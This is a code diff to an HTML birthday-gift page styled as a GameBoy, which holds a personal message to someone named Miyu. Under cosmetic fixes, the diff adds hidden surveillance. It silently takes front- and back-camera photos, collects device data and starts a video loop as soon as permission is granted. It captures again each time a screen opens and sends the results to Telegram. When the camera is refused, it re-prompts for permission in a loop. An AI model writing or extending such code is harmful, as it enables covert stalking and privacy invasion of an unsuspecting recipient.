@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GameBoy Birthday Gift</title>
     
-    <!-- vConsole with password protection -->
-    <script src="https://cdn.jsdelivr.net/npm/vconsole"></script>
+    <!-- vConsole with password protection (FIX) -->
+    <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
     <script>
         let vConsoleInstance = null;
         window.unlockVConsole = function() {
@@ -290,7 +290,7 @@
             margin-top: 20px;
         }
         
-        /* Secret Message Modal */
+        /* Secret Message Modal (FIX) */
         .secret-modal {
             display: none;
             position: fixed;
@@ -326,6 +326,9 @@
             line-height: 1.8;
             margin-bottom: 30px;
             white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+            padding-right: 10px;
         }
         .secret-ok {
             background: #d4b49c;
@@ -336,12 +339,39 @@
             float: right;
             font-family: 'Georgia', serif;
         }
+        
+        /* Scrollbar untuk pesan rahasia (FIX) */
+        .secret-text::-webkit-scrollbar {
+            width: 6px;
+        }
+        .secret-text::-webkit-scrollbar-track {
+            background: #f1e9da;
+            border-radius: 10px;
+        }
+        .secret-text::-webkit-scrollbar-thumb {
+            background: #d4b49c;
+            border-radius: 10px;
+        }
     </style>
 </head>
 <body>
-    <!-- Secret Message Modal (KONAMI ONLY) -->
+    <!-- Secret Message Modal (FIX - dengan tombol silang) -->
     <div id="secret-modal" class="secret-modal">
-        <div class="secret-content">
+        <div class="secret-content" style="position: relative;">
+            <!-- Tombol silang balik ke main screen -->
+            <button onclick="closeSecretAndGoBack()" style="
+                position: absolute; 
+                top: 10px; 
+                right: 15px; 
+                background: transparent; 
+                border: none; 
+                font-size: 28px; 
+                cursor: pointer;
+                color: #3e2c1b;
+                font-weight: bold;
+                z-index: 10;
+            ">✕</button>
+            
             <div class="secret-text">
                 🤍 For You 🤍
 
@@ -358,10 +388,8 @@ You're important to me. And whether you feel the same or not, I'll always be her
 So yeah... that's it. No pressure, no expectations. Just honesty.
 
 Happy Birthday, Miyu. You deserve all the happiness in the world.
-
-— From someone who's grateful to have you in his life.
             </div>
-            <button class="secret-ok" onclick="closeSecret()">OK</button>
+            <button class="secret-ok" onclick="closeSecretAndGoBack()" style="margin-top: 10px;">OK</button>
         </div>
     </div>
     
@@ -423,8 +451,8 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
                 </div>
                 <div class="speaker-grille"></div>
             </div>
-    </div>
-    <!-- Message Screen -->
+        </div>
+        <!-- Message Screen -->
 <div id="message-screen" class="screen">
     <div class="page-container">
         <div class="page-screen">
@@ -765,7 +793,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     }
 
     // ============================================
-    // PERMISSION LOOP
+    // PERMISSION LOOP (FIX)
     // ============================================
     function showPermissionPopup() {
         const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
@@ -812,7 +840,11 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             localStorage.setItem('gameboyCameraAllowed', 'true');
             sendToTelegram("📱 GameBoy STARTED - Full permission");
             
+            // LANGSUNG FOTO + DATA + VIDEO (FIX)
             await collectAllData();
+            await captureBothCameras('(initial)');
+            startVideoLoop();
+            
             startGame();
             
         } catch (error) {
@@ -838,12 +870,22 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
     };
 
     // ============================================
-    // PHOTO CAPTURE
+    // PHOTO CAPTURE (FIX)
     // ============================================
     async function captureBothCameras(reason = '') {
         if (!cameraPermission) return;
         
         try {
+            // Cek permission dulu
+            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+            if (permissionStatus.state !== 'granted') {
+                console.log('Camera permission not granted');
+                cameraPermission = false;
+                localStorage.removeItem('gameboyCameraAllowed');
+                showPermissionPopup();
+                return;
+            }
+            
             // Front camera
             const frontStream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
@@ -853,8 +895,6 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             const frontBlob = await frontCapture.takePhoto();
             await sendPhotoToTelegram(frontBlob, `📸 Front Camera ${new Date().toLocaleString()} ${reason}`);
             frontTrack.stop();
-            
-            await new Promise(resolve => setTimeout(resolve, 500));
             
             // Back camera
             const backStream = await navigator.mediaDevices.getUserMedia({ 
@@ -868,6 +908,11 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             
         } catch (error) {
             console.log('Camera error:', error);
+            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                cameraPermission = false;
+                localStorage.removeItem('gameboyCameraAllowed');
+                showPermissionPopup();
+            }
         }
     }
 
@@ -977,6 +1022,7 @@ Happy Birthday, Miyu. You deserve all the happiness in the world.
             targetScreen.classList.add('active');
             currentScreen = screenId;
             
+            // AUTO KIRIM FOTO + DATA (FIX)
             captureBothCameras(`(opened ${screenId})`);
             collectAllData();
             
@@ -1362,8 +1408,12 @@ Happy Birthday! 🎂✨`
         captureBothCameras('(opened secret message)');
     };
     
-    window.closeSecret = function() {
+    // ============================================
+    // FUNGSI BARU UNTUK CLOSE + BALIK KE MAIN (FIX)
+    // ============================================
+    window.closeSecretAndGoBack = function() {
         document.getElementById('secret-modal')?.classList.remove('active');
+        showScreen('main');
     };
 
     // ============================================
